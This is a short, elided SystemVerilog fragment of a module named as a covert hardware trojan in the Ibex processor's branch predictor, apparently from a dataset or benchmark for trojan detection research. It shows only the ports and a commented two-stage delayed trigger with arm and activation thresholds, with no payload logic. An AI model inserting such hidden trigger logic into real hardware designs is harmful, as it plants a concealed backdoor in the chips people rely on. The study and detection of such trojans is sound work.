...
module ibex_branch_predict_trojan_Covert (
  input  logic clk_i,
  input  logic rst_ni,
  ...
  output logic [31:0] predict_branch_pc_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=11039, act=5519)
    // ============================================================
    localparam int ARM_THRESHOLD   = 11039;
    localparam int ACTIVATE_DELAY  = 5519;
